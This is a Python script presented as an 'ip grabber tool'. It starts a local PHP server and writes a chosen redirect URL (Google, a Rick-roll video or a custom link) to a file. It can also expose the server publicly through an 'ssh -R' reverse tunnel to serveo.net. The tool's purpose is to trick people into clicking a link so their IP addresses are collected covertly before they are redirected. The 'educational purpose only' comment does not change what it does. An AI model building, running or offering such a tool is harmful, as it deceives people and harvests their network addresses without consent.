import subprocess
import time
import random
import requests
cmd3 = subprocess.Popen("clear", shell=True)
time.sleep(0.5)

# Tool-made-by-https://github.com/Blankred0
# This is an ip grabber tool made for educatinal pupose only. I am not 0,01% responsable of what your doing with this tool.
print ("Welcome to this ip grabber tool !\n\n")
loop = "N"
redirection_site = int(input("Before starting the server please enter the name of\n the site you want to redirect to\n 1-Google\n 2-Rick-roll\n 3-custom\n:"))
if redirection_site == 1:
	redirection_site = "https://www.google.com/"
elif redirection_site == 2:
	redirection_site = "https://youtu.be/dQw4w9WgXcQ?si=8dJeaOaddeXQt5cb"
elif redirection_site == 3:
	redirection_site = input("Your custom link :")
else:
	print ("Wrong input ending programm...\n")
	loop = ""

with open("redirect_url.txt", "w") as file:
    file.write(redirection_site)

random_ports = random.randint(1024, 65536)
print("Ports aléatoires :", random_ports)
cmd2 = "clear"
subdomain =""
servelink = "ssh -R " + str(subdomain) + "80:localhost:" + str(random_ports) + " serveo.net"
server_start = "php -S localhost:" + str(random_ports)
Link = ("\nLocal link : http://localhost:" + str(random_ports))
server_end = subprocess.Popen(server_start, shell=True)
time.sleep(1)


while loop == "N":
	print (Link)
	loop = input("\n \nPress [Enter] to stop server\n Type [C] to clear the terminal\n Type [serveo] to expose to the internet\n :")
	loop = loop.lower()
	if loop == "c" :
		cmd3 = subprocess.Popen(cmd2, shell=True)
		loop = "N"
	elif loop == "serveo":
		choose_subdomain = input('Do you want to choose your subdomain ?\n [Y]es\n [N]o\n :')
		choose_subdomain = choose_subdomain.lower()
		if choose_subdomain == "y" :
			subdomain = input("Choose your subdomain :")
			subdomain = str(subdomain) + ":"
			servelink = "ssh -R " + str(subdomain) + "80:localhost:" + str(random_ports) + " serveo.net"
			serveo_end = subprocess.Popen(servelink, shell=True)
			time.sleep(5)
			serveo_end.wait()
			loop = "N"
		else :
			subdomain = ""
			servelink = "ssh -R " + str(subdomain) + "80:localhost:" + str(random_ports) + " serveo.net"
			print ("Starting serveo...")
			print ("Press ctrl + c to exit serveo")
			serveo_end = subprocess.Popen(servelink, shell=True)
			time.sleep(5)
			serveo_end.wait()
			loop = "N"

	elif loop == "":
		print("Stopping server...")
	else:
		print("You must enter a valid input !")
		loop = "N"
	time.sleep(0.01)
print ("Server end !")
# Stop the local php server
server_end.terminate()
